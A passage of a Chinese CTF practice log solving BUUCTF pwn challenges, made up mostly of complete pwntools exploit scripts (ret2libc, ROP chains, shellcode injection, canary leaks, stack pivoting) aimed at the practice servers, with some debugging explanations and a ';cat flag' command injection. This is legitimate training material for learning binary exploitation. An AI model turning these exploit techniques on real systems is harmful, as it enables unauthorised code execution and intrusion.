elf.sym[&#x27;main&#x27;]r.recvuntil(&#x27;read?&#x27;)r.sendline(&#x27;-1&#x27;)r.recvuntil(&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4) + p32(printf_plt) + p32(start_addr) + p32(printf_got)r.sendline(payload)r.recvuntil(&#x27;\\n&#x27;)printf_addr=u32(r.recv(4))libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)libc_base = printf_addr-libc.dump(&#x27;printf&#x27;)system_addr = base+libc.dump(&#x27;system&#x27;)bin_sh = base + libc.dump(&#x27;str_bin_sh&#x27;)r.recvuntil(&#x27;read?&#x27;)r.sendline(&#x27;-1&#x27;)r.recvuntil(&quot;data!\\n&quot;)payload = b&#x27;a&#x27;*(0x2c+4)+p32(system_addr)+p32(start_addr)+p32(bin_sh)r.sendline(payload)r.interactive()\n\n30 jarvisoj_level3ret2libc\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc-2.19.so&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,28662)def dbg():    gdb.attach(p)    pause()write_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]main = elf.sym[&#x27;main&#x27;]payload = b&#x27;b&#x27;*0x88+b&#x27;b&#x27;*0x4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(0x4)p.recvuntil(&#x27;Input:\\n&#x27;)p.sendline(payload)write_addr = u32(p.recv(4))libc = LibcSearcher(&#x27;write&#x27;,write_addr)libc_base = write_addr-libc.dump(&#x27;write&#x27;)log.info(&quot;libc_base:&quot;+hex(libc_base))sys = libc_base+libc.dump(&#x27;system&#x27;)binsh = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;b&#x27;*0x88+b&#x27;b&#x27;*0x4+p32(sys)+p32(0)+p32(binsh)p.sendline(payload)p.interactive()\n\n31 ciscn_2019_s_3施工中……\n32 wustctf2020_getshellret2text\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,25069)def dbg():    gdb.attach(p)    pause()payload = b&#x27;b&#x27;*0x18+b&#x27;b&#x27;*0x4+p32(0x8048524)p.sendline(payload)p.interactive()\n\n33 ez_pz_hackover_2016 (动态调试入门)一道很好的动态调试入门题\n检查保护\n[*] &#x27;/home/pwn/pwn/buuctf/33/pwn&#x27;    Arch:       i386-32-little    RELRO:      Full RELRO    Stack:      No canary found    NX:         NX unknown - GNU_STACK missing    PIE:        No PIE (0x8048000)    Stack:      Executable    RWX:        Has RWX segments    Stripped:   No\n\n保护全关，有可读可写可执行段，可能是shellcode\n看下题目\n\nmemchr函数在网上搜索一下就好，这里不做详细介绍，主要是看到最后有一个比较，如果在\\n之前为crasheme，则可以进入vuln函数\n\n明显的溢出漏洞，dest仅有0x32字节，但是可以读入0x400字节，往里面写入shellcode\n思路\n往s里写入shllcode，执行vuln函数后让dest溢出，将返回地址修改为shellcode的地址\n实施\n但是dest是栈上的数据，一般情况下我们是找不到我们写入的地址的，那就没办法执行shellcode的地址。\n执行一次程序可以发现其实程序一开始就把我们输入的地址给我们了\nprintf(&quot;Yippie, lets crash: %p\\n&quot;, s);\n\n那么我们算出shellcode和我们输入的起始位置的偏移，就可以得到shellcode的地址\n先写一个测试脚本\nfrom pwn import *context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()p=process(&#x27;./pwn&#x27;)context.log_level=&#x27;debug&#x27;gdb.attach(p,&#x27;b *0x8048600&#x27;)#利用gdb动调，在0x8048600处下了个断点p.recvuntil(&#x27;crash: &#x27;)stack=int(p.recv(10),16)print (hex(stack))payload=&#x27;crashme\\x00&#x27;+&#x27;aaaaaa&#x27;#前面的crashme\\x00绕过if判断      #后面的aaaa是测试数据，随便输入的，我们等等去栈上找它的地址pause()p.sendline(payload)pause()\n\n0x8048600是一个nop指令的地址，在这里下一个断点，方便调试\n\n这里输入地址的结尾是abc\n按c执行下一步，然后输入stack 50看一下栈布局\n\n解决一下shellcode在栈上的位置（填充多少数据合适）\n可以看到我们输入的crashme有一部分在距离esp0x24处，因为没有对齐的原因，cr在上面一行，对应0x63 0x72(小端序)\n然后ebp在0x38处，我们输入的参数0x22处（虽然左边标的是0x20，但是有两个字节不是我们输入的，真正输入的是0x72 0x63)，所以ebp距离我们输入点的距离是0x38-0x22=0x16，而shellcode是写在ebp后面的，也就是0x16+0x4的地方\npayload = b&#x27;crashme\\x00&#x27;+b&#x27;a&#x27;*(0x16-8+4)+p32(addr)\n\n\ncrashme\\x00占8个字节减去，ebp占4个字节要覆盖\n\n解决shllcode的地址问题\n上面已经将我们的输入地址打印出来了（结尾是abc，在ebp下面）\n既然我们只有一次输入机会，那么我们构造完返回地址之后直接跟着shellcode好了，所以直接把地址返回到ebp+8的位置就行\n0xfff9eabc-0xfff9eaa0=0x1c，所以最终地址偏移为0x1c\n最后得到exp\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()#elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)def dbg():    gdb.attach(p)    pause()p=remote(&#x27;node5.buuoj.cn&#x27;,26858)p.recvuntil(&#x27;crash: &#x27;)stack_addr=int(p.recv(10),16)shellcode=asm(shellcraft.sh())payload=b&#x27;crashme\\x00&#x27;+b&#x27;a&#x27;*(0x16-8+4)+p32(stack_addr-0x1c)+shellcodep.sendline(payload)p.interactive()\n\n\n\n34 jarvisoj_level3_x6464位的***ret2libc***从栈传参变成了寄存器传参\nfrom pwn import *from LibcSearcher import *p = remote(&#x27;node5.buuoj.cn&#x27;,28910)#p=process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)rdi_add = 0x4006b3rsir15_add = 0x4006b1write_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]vul_add = elf.symbols[&#x27;vulnerable_function&#x27;]payload = b&#x27;a&#x27;*0x80 + b&#x27;a&#x27;*0x8payload1=payload+p64(rdi_add)+p64(0x1)+p64(rsir15_add)+p64(write_got)+b&#x27;deadbeef&#x27;+p64(write_plt)+p64(vul_add)p.recvuntil(&quot;Input:\\n&quot;)p.sendline(payload1)write_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))libc=LibcSearcher(&#x27;write&#x27;,write_addr)libc_base=write_addr-libc.dump(&#x27;write&#x27;)sys_add = libc_base + libc.dump(&#x27;system&#x27;)binsh_add =libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload2 = payload + p64(rdi_add) + p64(binsh_add) + p64(sys_add)p.sendline(payload2)p.interactive()\n\n35 mrctf2020_shellcoderet2shellcode\nida没法反编译了，这次读汇编（其实只要传入shellcode就行）\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,26947)def dbg():    gdb.attach(p)    pause()shellcode = asm(shellcraft.sh())p.sendline(shellcode)p.interactive()\n\n接下来看一下汇编\n\nbuf= byte ptr -410h\t;buf 表示相对于基指针 rbp 偏移量为 -410h 的一个字节内存位置var_4= dword ptr -4\t;var_4 表示相对于基指针 rbp 偏移量为 -4 的一个双字（32 位，4 字节）内存位置\n\npush    rbpmov     rbp, rspsub     rsp, 410h\n\n这里是开辟0x410字节空间的栈\n中间一部分应该是缓冲区设置，没看懂，但也不需要看懂，跳过\nlea     rdi, s          ; &quot;Show me your magic!&quot;call    _puts\n\n\nlea rdi, s：将字符串 &quot;Show me your magic!&quot; 的地址加载到 rdi 寄存器中，作为 _puts 函数的参数。\n\ncall _puts：调用 _puts 函数输出字符串，并自动添加换行符。\n\n\nlea     rax, [rbp+buf]mov     edx, 400h       ; nbytesmov     rsi, rax        ; bufmov     edi, 0          ; fdmov     eax, 0call    _read\n\n\nlea rax, [rbp+buf]：计算相对于基指针 rbp 偏移量为 -410h 的内存地址，并将其加载到 rax 寄存器中，作为读取数据的缓冲区地址。\nmov edx, 400h：将读取的最大字节数 400h 加载到 edx 寄存器中。\nmov rsi, rax：将缓冲区地址传递给 _read 函数的第二个参数。\nmov edi, 0：将文件描述符 0（标准输入）传递给 _read 函数的第一个参数。\nmov eax, 0：将返回值寄存器 eax 清零。\ncall _read：调用 _read 函数从标准输入读取最多 400h 字节的数据到缓冲区中。\n\nmov     [rbp+var_4], eaxcmp     [rbp+var_4], 0jg      short loc_11D6\n\n\nmov [rbp+var_4], eax：将 _read 函数的返回值（实际读取的字节数）保存到相对于基指针 rbp 偏移量为 -4 的内存位置（var_4)\ncmp [rbp+var_4], 0：比较实际读取的字节数是否为 0，用于后续的条件判断。\njg基于前面 cmp [rbp+var_4], 0 指令设置的标志位进行判断。[rbp+var_4] 中存储的是 _read 函数实际读取的字节数，如果这个值大于 0，程序就会跳转到 loc_11D6 标签处继续执行；如果不满足条件（即读取的字节数小于等于 0），则继续顺序执行下一条指令。\n\n若失败，即无读入（左边）\nmov     eax, 0jmp     short locret_11E4\n\n\nmov eax, 0：将寄存器 eax 赋值为 0。在很多系统调用和函数返回中，eax 通常用于存储返回值，这里将其置为 0 表示程序以正常状态退出或者操作失败的返回码。\njmp short locret_11E4：无条件跳转到 locret_11E4 标签处，跳过后续代码直接进入函数返回流程。\n\n若成功，即有读入（右边）\nloc_11D6:                               ; CODE XREF: main+78↑jlea     rax, [rbp+buf]call    raxmov     eax, 0\n\n\nloc_11D6：这是一个代码标签，当满足 jg 跳转条件时会跳转到这里。\nlea rax, [rbp+buf]：lea 是加载有效地址指令，这里将相对于基指针 rbp 偏移量为 -410h（前面定义的 buf）的内存地址加载到 rax 寄存器中。\ncall rax：这是一个间接调用指令，它会将程序控制权转移到 rax 寄存器所指向的地址处执行代码。\nmov eax, 0：同样将寄存器 eax 赋值为 0，可能用于表示函数的正常返回状态。\n\n综上，可以很清楚的发现，直接往buf里面写入代码之后函数就会直接执行buf里的代码，所以直接注入shellcode就行\n36 bjdctf_2020_babyrop2格式化字符串+canary绕过+ret2libc\n我记得写过canary绕过的wp，忘了在哪了，再写一份吧\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,26391)def dbg():    gdb.attach(p)    pause()put_plt=elf.plt[&#x27;puts&#x27;]put_got=elf.got[&#x27;puts&#x27;]pop_rdi=0x0400993main_addr=elf.symbols[&#x27;main&#x27;]vuln_addr=0x400887p.sendlineafter(&#x27;help u!\\n&#x27;,b&#x27;%7$p&#x27;)p.recvuntil(b&#x27;0x&#x27;)canary = int(p.recv(16),16)payload = p64(canary)payload = payload.rjust(0x20,b&#x27;a&#x27;)+b&#x27;a&#x27;*8+p64(pop_rdi)+p64(put_got)+p64(put_plt)+p64(vuln_addr)p.sendlineafter(b&#x27;story!\\n&#x27;,payload)put_addr=u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))libc=LibcSearcher(&#x27;puts&#x27;,put_addr)libcbase=put_addr-libc.dump(&quot;puts&quot;)system_addr=libcbase+libc.dump(&quot;system&quot;)binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)payload = p64(canary)payload = payload.rjust(0x20,b&#x27;a&#x27;)+b&#x27;a&#x27;*8+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)+p64(vuln_addr)p.sendlineafter(&#x27;story!\\n&#x27;,payload)p.interactive()\n\n审题\n\nchecksec一下，发现开启了NX和canary\n\nida看一下，直接去gift()函数\n\n\n\nv2就是canary值（一会后面解释canary保护），距离rbp为0x-8\n\n这里还读入了format函数，格式化字符串试试，看看我们的第几个输入可以被解析为格式化字符\n\n我是输入aa%n$p,一个个试过去，看看哪个对应出61，最后发现输入aa%6$p的时候输出为aa0x702436256161，说明：第六个参数可以被解析成格式化字符串\n\n接下来动态调试一下看看canary的值是哪个（不出意外就是后一个）\n\n在printf处下断点，然后run运行到断点处，输入aa，然后查看栈结构\n\ncanary值（v2)在rbp-8处，而我们输入的aa在它的上面，所以canary值可以用%7$p打印出来\n\n\n\n\n\ncanary保护简单来说，就是程序在开始运行前从一块只读数据中读出来一个随机数存在栈底（rbp上面一个），然后返回的时候看看栈底这个数变了没，变了就说明被栈溢出了，程序中断。\n而想要绕过也很简单，只需要我们将canary的值读出来，在构造payload的时候放在它本来就该在的位置就好了\npayload = p64(canary)\t# 写入canary值payload = payload.rjust(0x20,b&#x27;a&#x27;)\t# buf距离rbp为0x20，所以直接将canary和垃圾数据一起填满这32字节\n\n后面3就是正常的ret2libc了，都写烂了要，不说了\n37 babyheap_0ctf_2017施工施工，heap先等等\n38 bjdctf_2020_router考察linux下的命令机制\n命令一；命令二这样的格式会执行两种指令\nida里面一看，system(dest),前面还有一段将buf拼接到dest后面，那直接输入;cat flag秒了，exp都不用。直接nc\n39 inndy_roprop一把梭*\n打开ida一看，这么多函数，这么明显的溢出，直接ropchain一把梭\nROPgadget --binary pwn --ropchain直接可以生成rop链，把溢出填充好就直接用就行\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#r = process(&#x27;./pwn&#x27;)r = remote(&#x27;node5.buuoj.cn&#x27;,29636)def dbg():    gdb.attach(r)    pause()#!/usr/bin/env python3# execve generated by ROPgadgetfrom struct import pack# Padding goes herep = b&#x27;a&#x27;*0xC+b&#x27;b&#x27;*0x4p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;/bin&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;//sh&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080de769) # pop ecx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806c943) # int 0x80r.sendline(p)r.interactive()\n\n40 jarviso_level4ret2libc\nfrom pwn import *from LibcSearcher import *from ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,28452)def dbg():    gdb.attach(p)    pause()main = elf.sym[&#x27;main&#x27;]write_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]payload = b&#x27;a&#x27;*0x88+b&#x27;b&#x27;*0x4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(0x4)p.sendline(payload)write_addr = u32(p.recv(4))libc = LibcSearcher(&#x27;write&#x27;,write_addr)libc_base = write_addr-libc.dump(&#x27;write&#x27;)log.info(&#x27;libc_base:&#x27;+hex(libc_base))sys = libc_base+libc.dump(&#x27;system&#x27;)binsh = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;a&#x27;*0x88+b&#x27;b&#x27;*0x4+p32(sys)+p32(0)+p32(binsh)p.sendline(payload)p.interactive()\n\nbuu刷题记录（41-60题）by Maple\n41 picoctf_2018_buffer overflow 1ret2text\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29931)def dbg():    gdb.attach(p)    pause()payload = b&#x27;b&#x27;*0x28+b&#x27;b&#x27;*0x4+p32(0x80485CB)p.sendline(payload)p.interactive()\n\n42 jarvisoj_test_your_memoryret2text\n别看题上那些有的没的，有个溢出点，有个system,还有cat flag字符串，直接构造rop\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,27254)def dbg():    gdb.attach(p)    pause()sys = 0x80485C9flag_addr = 0x80487E0payload = b&#x27;b&#x27;*0x13+b&#x27;b&#x27;*0x4+p32(sys)+p32(flag_addr)p.sendline(payload)p.interactive()\n\n43 [ZJCTF 2019]EasyHeap施工中\n44 hitcontraining_uaf施工中\n45 pwnable_orw沙箱\n就是ban了一些危险的函数，但是以获得flag为目的的话也不需要非得getshell\nfrom pwn import *context(arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,26440)#p = process(&#x27;./pwn&#x27;)bss = 0x804A060shellcode = shellcraft.open(&#x27;flag&#x27;)shellcode+=shellcraft.read(&#x27;eax&#x27;,bss+100,100)shellcode+=shellcraft.write(1,bss+100,100)payload = asm(shellcode)p.recvuntil(&#x27;shellcode:&#x27;)p.sendline(payload)#log.info(p.recv())p.interactive()\n\n46 picoctf_2018_buffer overflow 2from pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,28047)#gdb.attach(p)payload = b&#x27;b&#x27;*0x6c+b&#x27;b&#x27;*0x4+p32(0x080485CB)+p32(0)+p32(0xDEADBEEF)+p32(0xDEADC0DE)p.sendline(payload)p.interactive()\n\n47 cmcc_simpleroprop\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29845)#gdb.attach(p)read_addr = elf.sym[&#x27;read&#x27;]pop_edx_ecx_ebx = 0x0806e850binsh = 0x80EB584int_addr = 0x80493e1\t# int 0x80pop_eax = 0x80bae06payload = b&#x27;b&#x27;*0x20+p32(read_addr)+p32(0xdeadbeef)+p32(0)+p32(binsh)+p32(0x8)payload+=p32(pop_eax)+p32(0xb)+p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(binsh)+p32(int_addr)p.sendline(payload)p.send(&#x27;/bin/sh&#x27;)p.interactive()\n\n分析分析这种纯手工构造ROP还是可以分析分析的\n\n首先是系统调用的知识，可以看这里\n\n省流一下：int 0x80就是系统调用（syscall），然后根据syscall(n)中n的值执行不同函数，其中0xb可以执行execve函数\n\n\n接下来构造ROP\n\n先是溢出覆盖，这里ida显示的不对，动态调试可以发现实际的偏移是0x1c\n\n\n我们输入的相对位置是0x24,ebp的相对位置是0x40，实际偏移0x40-0x24=0x1c\n\n\n因为程序中没有/bin/sh函数，所以我们需要调用一下read函数，以此输入一个/bin/sh进去（这里binsh的地址是bss段，因为没开PIE，所以地址所见即所得）\n\n接下来第二行就是进行系统调用了，我们要申请的函数是\nint 0x80(0xb,’/bin/sh‘, null, null);//对应寄存器eax, ebx,\t ecx,  edx\n\n这四个寄存器地址也确实可以搜到，所以根据寄存器依次输入需要的数就好\n\n\n\n\n48 [Black Watch 入群题]PWN栈迁移+ret2libc\n因为没有RWX段，所以不可以写入shellcode然后栈迁移执行\nfrom pwn import *#p = process(&#x27;./pwn&#x27;)p = remote(&quot;node5.buuoj.cn&quot;, 25707)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)main_addr = 0x8048513lea_ret_addr = 0x8048511plt_write = elf.plt[&#x27;write&#x27;]got_write = elf.got[&#x27;write&#x27;]bss_s_addr = 0x804A300payload1 = b&#x27;a&#x27; * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(got_write) + p32(4)p.sendafter(&quot;name?&quot;, payload1)payload2 = b&#x27;a&#x27; * 0x18 + p32(bss_s_addr) + p32(lea_ret_addr)p.sendafter(&quot;say?&quot;, payload2)write_addr = u32(p.recv(4))offset = write_addr - libc.symbols[&#x27;write&#x27;]binsh = offset + libc.search(&#x27;/bin/sh&#x27;).__next__()system = offset + libc.symbols[&#x27;system&#x27;]payload3 = b&#x27;aaaa&#x27; + p32(system) + b&#x27;aaaa&#x27; + p32(binsh)p.sendafter(&quot;name?&quot;, payload3)p.sendafter(&quot;say?&quot;, payload2)p.interactive()\n\n\n\n49 wustctf2020_getshell_2基础ROP\nsystem(&#x2F;sh)也可以getshell\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,28502)sh = 0x08048670call_sys = 0x8048529payload = b&#x27;b&#x27;*0x18+b&#x27;b&#x27;*0x4+p32(call_sys)+p32(sh)p.recvuntil(b&#x27;\\n&#x27;)p.sendline(payload)p.interactive()\n\n50 mrctf2020_easyoverflow栈数据覆盖\n发现当check(v5)等于n0t_r3@11y_f1@g时会getshell，然后v4的读入不限制长度，可以覆盖掉v5的值\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29336)payload = b&#x27;b&#x27;*0x30+b&#x27;n0t_r3@11y_f1@g&#x27;p.sendline(payload)p.interactive()\n\n\n\n51 bbys_tu_2016ret2text\nida里面的偏移有问题，需要动态调试看看\n\n这里-14，说明偏移为14\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,25770)#gdb.attach(p)flag_addr = 0x804856Dpayload = b&#x27;b&#x27;*0x18+p32(flag_addr)p.sendline(payload)p.interactive()\n\n52 xdctf2015_pwn200ret2libc\nfrom pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)e=ELF(&#x27;./pwn&#x27;)p=remote(&#x27;node5.buuoj.cn&#x27;,25844)write_got=e.got[&quot;write&quot;]write_plt=e.plt[&quot;write&quot;]main_add=e.sym[&quot;main&quot;]payload=b&quot;a&quot;*(0x6c+4)+p32(write_plt)+p32(main_add)+p32(1)+p32(write_got)+p32(5)p.sendline(payload)p.recvuntil(&quot;Welcome to XDCTF2015~!\\n&quot;)write=u32(p.recvuntil(&#x27;\\xf7&#x27;)[-4:])print(&quot;write:&quot;,hex(write))libc_base=write-0xd43c0system = 0x3a940 + libc_basebin_sh = 0x15902b + libc_basep.recvuntil(&quot;Welcome to XDCTF2015~!\\n&quot;)payload2=b&quot;a&quot;*(0x6c+4)+p32(system)+p32(main_add)+p32(bin_sh)p.send(payload2)p.interactive()\n\n53 wustctf2020_closed重定向\nida看一下\n__int64 vulnerable()&#123;  puts(&quot;HaHaHa!\\nWhat else can you do???&quot;);  close(1);  close(2);  return shell();&#125;\n\n关闭了标准输出（1）和错误输出（2），就算是getshell了也不会得到回显。所以可以利用exec 1&gt;&amp;0将标准输出重定向到标准输入\n标准文件描述符\n标准输入（stdin）：使用文件描述符0（FD 0）表示，默认情况下终端键盘输入与其关联。\n标准输出（stdout）：使用文件描述符1（FD 1）表示，默认情况下终端屏幕显示与其关联。\n标准错误（stderr）：使用文件描述符2（FD 2）表示，默认情况下终端屏幕显示与其关联。\n\n重定向exec 1&gt;&amp;0是Shell命令行中的重定向语法，用于将标准输出重定向到标准输入，因此后续的输出会被作为输入来处理\n所以只需要nc之后输入exec 1&gt;&amp;0就可以了\n54 ciscn_2019_s_4栈迁移\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,26010)#gdb.attach(p)leave_ret = 0x08048562sys = elf.sym[&#x27;system&#x27;]payload = b&#x27;a&#x27;*0x24+b&#x27;b&#x27;*0x4p.sendafter(&#x27;name?\\n&#x27;,payload)p.recvuntil(b&#x27;bbbb&#x27;)leak_addr = u32(p.recv(4))\t#\tebp的地址泄露出来log.info(&quot;leak_addr:&quot;+hex(leak_addr))buf = leak_addr-0x38\t# 回到栈顶payload2 = p32(sys)+p32(0)+p32(buf+0xc)+b&#x27;/bin/sh\\x00&#x27;\t# payload2 = payload2.ljust(0x28,b&#x27;a&#x27;)+p32(buf-4)+p32(leave_ret)p.send(payload2)p.interactive()\n\n动态调试分析\n先看下新栈的地址为什么是ebp-0x38\n\n\n这里是寄存器的地址，可以看到我们的字符串输入到了760处、而ebp指向了798处，相差0x38字节，所以将栈迁移到这里，方便执行我们的输入\n\n\n&#x3D;&#x3D;payload2 &#x3D; 